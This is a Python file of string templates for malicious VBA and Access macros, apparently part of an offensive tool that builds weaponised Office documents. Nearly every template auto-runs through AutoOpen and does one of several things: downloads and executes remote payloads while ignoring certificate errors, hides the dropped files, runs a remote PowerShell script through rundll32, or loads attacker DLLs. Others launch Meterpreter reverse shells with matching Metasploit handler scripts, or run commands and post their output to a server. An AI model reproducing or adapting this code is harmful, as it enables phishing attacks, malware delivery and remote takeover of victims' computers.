#!/usr/bin/env python
# encoding: utf-8

HELLO = \
"""
Private Sub Hello()
    MsgBox "Hello from <<<TEMPLATE>>>" & vbCrLf & "Have a nice day!"
End Sub

' Auto launch when VBA enabled
Sub AutoOpen()
    Hello
End Sub

"""

DROPPER = \
"""

'Download and execute file
' will override any other file with same name
Private Sub DownloadAndExecute()
    Dim myURL As String
    Dim realPath As String
    Dim WinHttpReq As Object, oStream As Object
    Dim result As Integer
    
    myURL = "<<<URL>>>"
    realPath = <<<DOWNLOAD_PATH>>>
    
    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    WinHttpReq.setOption(2) = 13056 ' Ignore cert errors
    WinHttpReq.Open "GET", myURL, False ', "username", "password"
    WinHttpReq.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    WinHttpReq.Send
    
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.ResponseBody
        oStream.SaveToFile realPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
        oStream.Close
        ExecuteCmdAsync realPath
    End If    
    
End Sub

' Auto launch when VBA enabled
Sub AutoOpen()
    DownloadAndExecute
End Sub
"""

DROPPER2 = \
"""

'Download and execute file
' File is protected with readonly, hidden, and system attributes
' Will not download if payload has already been dropped once on system
' will override any other file with same name
Private Sub DownloadAndExecute()
    Dim myURL As String
    Dim realPath As String
    Dim WinHttpReq As Object, oStream As Object
    Dim result As Integer
    
    myURL = "<<<URL>>>"
    realPath = "<<<DOWNLOAD_PATH>>>"
    
    If Dir(realPath, vbHidden + vbSystem) = "" Then
        Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
        WinHttpReq.setOption(2) = 13056 ' Ignore cert errors
        WinHttpReq.Open "GET", myURL, False ', "username", "password"
        WinHttpReq.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
        WinHttpReq.Send
        
        If WinHttpReq.Status = 200 Then
            Set oStream = CreateObject("ADODB.Stream")
            oStream.Open
            oStream.Type = 1
            oStream.Write WinHttpReq.ResponseBody
            
            oStream.SaveToFile realPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
            oStream.Close
            SetAttr realPath, vbReadOnly + vbHidden + vbSystem
            ExecuteCmdAsync realPath
        End If
       
    End If
    
End Sub

' Auto launch when VBA enabled
Sub AutoOpen()
    DownloadAndExecute
End Sub
"""


DROPPER_PS = \
r"""
' Download and execute powershell script using rundll32.exe, without powershell.exe
' Thx to https://medium.com/@vivami/phishing-between-the-app-whitelists-1b7dcdab4279
' And https://github.com/p3nt4/PowerShdll

' Auto launch when VBA enabled
Sub AutoOpen()
    Debugging
End Sub

Public Function Debugging() As Variant
    DownloadDLL
    Dim strCmd As String
    strCmd = "C:\Windows\System32\rundll32.exe " & Environ("TEMP") & "\powershdll.dll,main . { Invoke-WebRequest -useb <<<POWERSHELL_SCRIPT_URL>>> } ^| iex;"
    ExecuteCmdAsync strCmd
End Function


Sub DownloadDLL()
    Dim dll_Loc As String
    dll_Loc = Environ("TEMP") & "\powershdll.dll"
    If Not Dir(dll_Loc, vbDirectory) = vbNullString Then
        Exit Sub
    End If
    
    Dim dll_URL As String
    #If Win64 Then
        dll_URL = "https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x64/Release/PowerShdll.dll"
    #Else
        dll_URL = "https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x86/Release/PowerShdll.dll"
    #End If
    
    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    WinHttpReq.Open "GET", dll_URL, False
    WinHttpReq.send

    myURL = WinHttpReq.responseBody
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.responseBody
        oStream.SaveToFile dll_Loc
        oStream.Close
    End If
End Sub

"""


DROPPER_DLL1 = \
r"""
' Inspired by great work at: https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/
' Test with msfvenom.bat  -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f dll -o meter.dll

' Auto launch when VBA enabled
Sub AutoOpen()
    DropRunDll
End Sub

Private Sub DropRunDll()
    ' Chdir to download directory
    Dim dll_Loc As String
    dll_Loc = Environ("AppData") & "\Microsoft\<<<APPLICATION>>>"
    If Dir(dll_Loc, vbDirectory) = vbNullString Then
        Exit Sub
    End If
    
    VBA.ChDir dll_Loc
    VBA.ChDrive "C"
    
    'Download DLL
    Dim dll_URL As String
    dll_URL = "<<<DLL_URL>>>"

    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    WinHttpReq.Open "GET", dll_URL, False
    WinHttpReq.send

    myURL = WinHttpReq.responseBody
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.responseBody
        oStream.SaveToFile "Document1.asd", 2
        oStream.Close
        ' Call module which contains export for downloaded DLL
        <<<MODULE_2>>>.Invoke 
    End If
End Sub

"""

DROPPER_DLL2 = \
r"""
Private Declare Sub <<<DLL_FUNCTION>>> Lib "Document1.asd" ()

Sub Invoke()
    <<<DLL_FUNCTION>>>  ' call DLL function
End Sub
"""

DROPPER_DLL_VBS = \
r"""
Sub AutoOpen()
    DropRunDll
End Sub

Private Sub DropRunDll()
    'Download DLL
    Dim dll_URL As String
    dll_URL = "<<<DLL_URL>>>"

    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    WinHttpReq.Open "GET", dll_URL, False
    WinHttpReq.send

    myURL = WinHttpReq.responseBody
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.responseBody
        oStream.SaveToFile CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") & "\Document1.asd", 2
        oStream.Close
        ' Call dll using rundll32
        CreateObject("WScript.Shell").Run "%windir%\system32\rundll32.exe %temp%\Document1.asd,<<<DLL_FUNCTION>>>", 0
    End If
End Sub

"""


EMBED_DLL_VBS = \
r"""
'Option Explicit

Private Sub loadEmbeddedDll()
    DumpFile CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") & "\Document1.asd"
    CreateObject("WScript.Shell").Run "%windir%\system32\rundll32.exe %temp%\Document1.asd,<<<DLL_FUNCTION>>>", 0
End Sub

' Auto launch when VBA enabled
Sub AutoOpen()
    loadEmbeddedDll
End Sub

"""

EMBED_DLL_VBA = \
r"""
'Option Explicit

Private Sub loadEmbeddedDll()
    Dim dll_Loc As String
    dll_Loc = Environ("AppData") & "\Microsoft\<<<APPLICATION>>>"
    If Dir(dll_Loc, vbDirectory) = vbNullString Then
        Exit Sub
    End If
    ChDir dll_Loc
    DumpFile "Document1.asd"
    <<<MODULE_2>>>.Invoke 
End Sub

' Auto launch when VBA enabled
Sub AutoOpen()
    loadEmbeddedDll
End Sub

"""


METERPRETER =  \
r"""

Public RHOST As String 
Public RPORT As String

' Auto launch when VBA enabled
Sub AutoOpen()
    RHOST = "<<<RHOST>>>"
    RPORT = "<<<RPORT>>>"
    MacroMeter
End Sub

'Insert Meterpreter from vbLib here

"""


METERPRETER_RC =  \
r"""
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <<<LHOST>>> 
set LPORT <<<LPORT>>>
set AutoRunScript post/windows/manage/migrate
set EXITFUNC thread
set ExitOnSession false
set EnableUnicodeEncoding true
set EnableStageEncoding true
exploit -j
"""

WEBMETER =  \
r"""

Public RHOST As String 
Public RPORT As String
Public UseHTTPS As String

' Auto launch when VBA enabled
Sub AutoOpen()
    RHOST = "<<<RHOST>>>"
    RPORT = "<<<RPORT>>>"
    UseHTTPS = "yes"
    WebMeter
End Sub

'Insert WebMeter from vbLib here

"""

WEBMETER_RC = \
r"""
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <<<LHOST>>> 
set LPORT <<<LPORT>>>
set AutoRunScript post/windows/manage/migrate
set EXITFUNC thread
set ExitOnSession false
set EnableUnicodeEncoding true
set EnableStageEncoding true
exploit -j
"""


EMBED_EXE = \
r"""

Private Sub executeEmbed()
    Dim fileName As String
    fileName = "\<<<FILE_NAME>>>"
    Dim fullPath As String
    fullPath = Environ("TEMP") & fileName
    DumpFile fullPath
    ExecuteCmdAsync fullPath <<<PARAMETERS>>>
End Sub

' Auto launch when VBA enabled
Sub AutoOpen()
    executeEmbed
End Sub

"""

CMD = \
r"""

Sub AutoOpen()
    ExecuteCmdAsync "<<<CMDLINE>>>"
End Sub

"""

REMOTE_CMD = \
r"""

Dim serverUrl As String

' Auto launch when VBA enabled
Sub AutoOpen()
    Main
End Sub

Private Sub Main()
    Dim msg As String
    serverUrl = "<<<TEMPLATE>>>"
    msg = "<<<TEMPLATE>>>"
    On Error GoTo byebye
    msg = ExecuteCmdSync(msg)
    On Error Resume Next
    Err.Clear
    SendResponse msg
    On Error GoTo 0
    byebye:
End Sub

'Sen data using http post'
'Note:
'WinHttpRequestOption_SslErrorIgnoreFlags, // 4
' See https://msdn.microsoft.com/en-us/library/windows/desktop/aa384108(v=vs.85).aspx'
Private Function HttpPostData(URL As String, data As String) 'data must have form "var1=value1&var2=value2&var3=value3"'
    Dim objHTTP As Object
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    objHTTP.Option(4) = 13056  ' Ignore cert errors because self signed cert
    objHTTP.Open "POST", URL, False
    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    objHTTP.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
    objHTTP.SetTimeouts 2000, 2000, 2000, 2000
    objHTTP.send (data)
    HttpPostData = objHTTP.responseText
End Function

' Returns target ID'
Private Function GetId() As String
    Dim myInfo As String
    Dim myID As String
    myID = Environ("COMPUTERNAME") & "(" & Environ("USERDOMAIN")
    myInfo = myID & ")"
    GetId = myInfo
End Function

'To send response for command'
Private Function SendResponse(cmdOutput)
    Dim data As String
    Dim response As String
    Dim hostId As String
    hostId = GetId()
    data = "id=" &  hostId &  "&cmdOutput=" & cmdOutput
    SendResponse = HttpPostData(serverUrl, data)
End Function


"""

ACCESS_MACRO_TEMPLATE = \
r"""
Version =196611
PublishOption =1
ColumnsShown =0
Begin
    Action ="RunCode"
    Argument ="AutoExec()"
End
Begin
    Comment ="_AXL:<?xml version=\"1.0\" encoding=\"UTF-16\" standalone=\"no\"?>\015\012<UserI"
        "nterfaceMacro MinimumClientDesignVersion=\"14.0.0000.0000\" xmlns=\"http://schem"
        "as.microsoft.com/office/accessservices/2009/11/application\"><Statements><Action"
        " Name=\"RunCode\"><Argument Nam"
End
Begin
    Comment ="_AXL:e=\"FunctionName\">AutoExec()</Argument></Action></Statements></UserInterfa"
        "ceMacro>"
End

"""
